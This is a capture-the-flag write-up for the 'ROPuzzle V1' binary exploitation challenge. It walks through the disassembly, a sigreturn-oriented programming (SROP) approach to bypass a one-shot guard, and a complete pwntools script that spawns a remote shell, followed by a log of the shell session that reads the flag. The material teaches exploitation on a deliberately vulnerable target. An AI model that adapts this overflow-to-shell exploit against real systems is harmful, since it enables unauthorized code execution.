## ROPuzzle V1 - Still SROP ;)

This challenge has the same simple bufferoverflow but tries to make
exploitation harder by introducing a mechanism to make sure we exploit it in
one shot. Furthermore we have a few different gadgets available this time than
before.

### Disassembly

Let's have a look at the disassembly. I added some comments for easier
understanding

```  
Disassembly of section .text:

0000000000401000 <_start>:  
 401000:       e8 05 00 00 00          call   40100a <get_input>  
 401005:       e8 5e 00 00 00          call   401068 <exit>

000000000040100a <get_input>:  
 40100a:       48 83 ec 08             sub    rsp,0x8  
 40100e:       b8 00 00 00 00          mov    eax,0x0  
 401013:       bf 00 00 00 00          mov    edi,0x0  
 401018:       48 89 e6                mov    rsi,rsp  
 40101b:       ba 00 10 00 00          mov    edx,0x1000  
 401020:       0f 05                   syscall  
 401022:       8b 04 25 00 20 40 00    mov    eax,DWORD PTR ds:0x402000 ; set
RAX to value of safety variable  
 401029:       85 c0                   test   eax,eax  
 40102b:       75 3b                   jne    401068 <exit>             ;
if(var!=0){ exit(); }  
 40102d:       c7 04 25 00 20 40 00    mov    DWORD PTR ds:0x402000,0x1 ; set
var to 1  
 401034:       01 00 00 00  
 401038:       b8 00 00 00 00          mov    eax,0x0  
 40103d:       bb 00 00 00 00          mov    ebx,0x0  
 401042:       b9 00 00 00 00          mov    ecx,0x0  
 401047:       ba 00 00 00 00          mov    edx,0x0  
 40104c:       be 00 00 00 00          mov    esi,0x0  
 401051:       41 b8 00 00 00 00       mov    r8d,0x0  
 401057:       41 b9 00 00 00 00       mov    r9d,0x0  
 40105d:       41 ba 00 00 00 00       mov    r10d,0x0  
 401063:       48 83 c4 08             add    rsp,0x8  
 401067:       c3                      ret

0000000000401068 <exit>:  
 401068:       b8 3c 00 00 00          mov    eax,0x3c  
 40106d:       bf 00 00 00 00          mov    edi,0x0  
 401072:       0f 05                   syscall                          ;
exit() syscall  
 401074:       e8 ef ff ff ff          call   401068 <exit>             ; no
syscall;ret gadget this time

0000000000401079 <gadget_1>:  
 401079:       b8 06 00 00 00          mov    eax,0x6  
 40107e:       c3                      ret

000000000040107f <gadget_2>:  
 40107f:       b8 09 00 00 00          mov    eax,0x9  
 401084:       c3                      ret

0000000000401085 <gadget_3>:  
 401085:       48 89 c7                mov    rdi,rax  
 401088:       c3                      ret

0000000000401089 <gadget_4>:  
 401089:       48 89 f8                mov    rax,rdi  
 40108c:       c3                      ret

000000000040108d <gadget_5>:  
 40108d:       48 89 c6                mov    rsi,rax  
 401090:       c3                      ret

0000000000401091 <gadget_6>:  
 401091:       48 89 f0                mov    rax,rsi  
 401094:       c3                      ret

0000000000401095 <gadget_7>:  
 401095:       48 89 c2                mov    rdx,rax  
 401098:       c3                      ret

0000000000401099 <gadget_8>:  
 401099:       48 89 d0                mov    rax,rdx  
 40109c:       c3                      ret

000000000040109d <gadget_9>:  
 40109d:       48 f7 ef                imul   rdi  
 4010a0:       c3                      ret

00000000004010a1 <gadget_10>:  
 4010a1:       48 01 f8                add    rax,rdi  
 4010a4:       c3                      ret

00000000004010a5 <gadget_11>:  
 4010a5:       48 29 f8                sub    rax,rdi  
 4010a8:       c3                      ret

00000000004010a9 <gadget_12>:  
 4010a9:       48 f7 f7                div    rdi  
 4010ac:       c3                      ret

00000000004010ad <gadget_13>:  
 4010ad:       88 07                   mov    BYTE PTR [rdi],al  
 4010af:       48 81 ff 00 20 40 00    cmp    rdi,0x402000  
 4010b6:       74 b0                   je     401068 <exit>  
 4010b8:       c3                      ret  
```

Heres a quick rundown of what the program is doing:

1. read 0x1000 bytes from stdin to the stack  
2. check if value at 0x402000 is 0  
3. if the value is not zero (therefore it changed), exit the program  
4. set the value at 0x402000 to 1  
5. clear out all registers  
6. adjust stack and return

### My Exploit Idea

There isn't any gadget to directly control RAX, but multiple other gadgets
that can be used to set RAX to 15. This can be done by chaining the following
4 gadgets:

```  
0000000000401079 <gadget_1>:  
 401079:       b8 06 00 00 00          mov    eax,0x6  
 40107e:       c3                      ret

0000000000401085 <gadget_3>:  
 401085:       48 89 c7                mov    rdi,rax  
 401088:       c3                      ret

000000000040107f <gadget_2>:  
 40107f:       b8 09 00 00 00          mov    eax,0x9  
 401084:       c3                      ret

00000000004010a1 <gadget_10>:  
 4010a1:       48 01 f8                add    rax,rdi  
 4010a4:       c3                      ret  
```

This will simply add 9 to 6, which will result in RAX being set to 15, the
syscall number for sigret.

The next immediate problem is that we don't have the string `"/bin/sh"`
available at a known address within the binary. That means we have to place it
somewhere, where we can predict the address. We could return into get_input
and perform a 2nd read syscall to write the string onto the stack, except we
wouldn't be able to predict the address because of ASLR and the security check
will kick in an exit the program...

A different solution is needed. Luckily we can solve those two problems with
one method, SROP. First we set RSP to 0x402000 (.data) again just like before.
Now we have a stack, which will always have the same address and we can easily
predict. But how can we get around the security check for the variable set to
1? Easy! The stack is exactly at the address where the variable is located, so
all we need to do is overwrite it with a 0 by executing a read() syscall. Then
we can repeat the bufferoverflow and set up the execve() call with our fixed
stack.

### Building the Exploit

Okay, let's start building the payload up to this point. The following will
overflow the buffer, chain the gadgets to set RAX=15, and finally return to a
syscall and executing the sigret.

```py  
mov_rax_6 = 0x401079  
mov_rdi_rax = 0x401085  
mov_rax_9 = 0x40107f  
add_rax_rdi = 0x4010a1

payload = b'A'*8  
payload += p64(mov_rax_6)  
payload += p64(mov_rdi_rax)  
payload += p64(mov_rax_9)  
payload += p64(add_rax_rdi) # set rax=0xf  
payload += p64(0x401072) # syscall (sigret)  
```

Next we want to set up all the registers so we have a controlled stack and
overwrite the first value on the stack with a 0. The sigreturn frame will look
like this:

```py  
frame = SigreturnFrame()  
frame.rax = 0 # read() syscall  
frame.rdi = 0  
frame.rsi = 0  
frame.rdx = 0  
frame.rsp = 0x402000 # set stack to writable memory with know addr  
frame.rip = 0x401018 # jmp to get_input  
```

Once the sigreturn is executed the execution flow of the program will continue
here:

```  
 401018:       48 89 e6                mov    rsi,rsp  
 40101b:       ba 00 10 00 00          mov    edx,0x1000  
 401020:       0f 05                   syscall  
[...]  
```

Now the program will wait for input again, which will then be written to the
stack (0x402000). The first value of our input has to be 0, then we can
overflow the buffer again and set up another sigret just like before.

```py  
payload = p64(0) # overwrite sanity with 0  
payload += p64(mov_rax_6)  
payload += p64(mov_rdi_rax)  
payload += p64(mov_rax_9)  
payload += p64(add_rax_rdi) # set rax=0xf  
payload += p64(0x401072) # syscall (sigret)  
```

The last thing we need to do now is set up the sigreturn frame to execute
`execve("/bin/sh",0,0)` just like in V0. If you thought I forgot about
`"/bin/sh"`, worry not! Since we know the address of the stack all we have to
do is append the string at the very end of our payload and add the length of
the payload to the stack address. The code will look like this:

```py  
frame = SigreturnFrame()  
bin_sh = 0x402000 + len(payload) + len(bytes(frame)) # calculate /bin/sh
address  
frame.rax = 0x3b # execve()  
frame.rdi = bin_sh # /bin/sh address  
frame.rsi = 0  
frame.rdx = 0  
frame.rsp = 0x402000 # doesn't matter really  
frame.rip = 0x401072 # syscall

payload += bytes(frame) # add frame  
payload += b"/bin/sh\x00" # add /bin/sh  
```

### Short Recap of Exploit

1. Execute first sigret  
2. Shift stack to known address (0x402000)  
3. overwrite stack with 0 + ROPChain  
4. set up second sigret  
5. append "/bin/sh" at the end and calculate address  
6. trigger sigret  
7. execve("/bin/sh",0,0) and we win :)

### Final Exploit

Find my final exploit below:

```py  
from pwn import *  
import time

p = remote('193.57.159.27',52852)  
#p = process('./main')  
context.clear(arch='amd64')  
context.log_level = 'debug'

mov_rax_6 = 0x401079  
mov_rdi_rax = 0x401085  
mov_rax_9 = 0x40107f  
add_rax_rdi = 0x4010a1  
mov_rdi_al = 0x4010ad  
imul = 0x40109d

payload = b'A'*8  
payload += p64(mov_rax_6)  
payload += p64(mov_rdi_rax)  
payload += p64(mov_rax_9)  
payload += p64(add_rax_rdi) # set rax=0xf  
payload += p64(0x401072) # syscall (sigret)

frame = SigreturnFrame()  
frame.rax = 0 # read syscall  
frame.rdi = 0  
frame.rsi = 0  
frame.rdx = 0  
frame.rsp = 0x402000 # set stack to writable memory with know addr  
frame.rip = 0x401018 # jmp to get_input

# since we set rsp to 0x402000 (where sanity check is)  
# we can overwrite it with 0 to bypass the oneshot ;)

payload += bytes(frame)

# sending  
p.send(payload)  
time.sleep(0.1)

payload = p64(0) # overwrite sanity with 0  
payload += p64(mov_rax_6)  
payload += p64(mov_rdi_rax)  
payload += p64(mov_rax_9)  
payload += p64(add_rax_rdi) # set rax=0xf  
payload += p64(0x401072) # syscall (sigret)

frame = SigreturnFrame()  
bin_sh = 0x402000 + len(payload) + len(bytes(frame)) # calculate /bin/sh
address  
frame.rax = 0x3b # execve()  
frame.rdi = bin_sh # /bin/sh address  
frame.rsi = 0  
frame.rdx = 0  
frame.rsp = 0x402000 # doesn't matter really  
frame.rip = 0x401072 # syscall

payload += bytes(frame) # add frame  
payload += b"/bin/sh\x00" # add /bin/sh

p.send(payload)  
p.interactive()

"""  
┌──(kali㉿kali)-[~/ctf/digitaloverdose/pwn/V1]  
└─$ python3 exploit.py  
[+] Opening connection to 193.57.159.27 on port 52852: Done  
[*] Switching to interactive mode  
$ ls -la  
total 16  
drwxr-xr-x. 1 root root   22 Oct  9 00:05 .  
drwxr-xr-x. 1 root root   17 Oct  8 23:36 ..  
-rwxr--r--. 1 root root 1523 Oct  9 00:05 flag.txt  
-rwxr-xr-x. 1 root root 9384 Oct  9 00:04 run  
$ cat flag.txt  
DO{DO{9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9+9*9*9*9*9*9*9*9+9*9*9*9*9*9*9+9*9*9*9*9*9*9+9*9*9*9*9*9*9+9*9*9*9*9*9+9*9*9*9*9*9+9*9*9*9*9*9+9*9*9*9*9*9+9*9*9*9*9+9*9*9*9*9+9*9*9*9*9+9*9*9*9*9+9*9*9*9*9+9*9*9*9*9+9*9*9*9*9+9*9*9*9+9*9*9*9+9*9*9*9+9*9*9*9+9*9*9*9+9*9*9*9+9*9*9+9*9*9+9*9*9+9*9+9*9+9*9+9+9+9+9+9+9//9+9//9+9//9+9//9+9//9+9//9+9//9}}  
$ id  
uid=101(ractf) gid=65534(nogroup) groups=65534(nogroup)  
$ exit  
"""  
```

PS: After seeing the flag, maybe I didn't do what the author intended ;)

Original writeup (https://lo0l.com/2021/10/11/digitaloverdose.html#ropuzzle-v1
---still-srop-).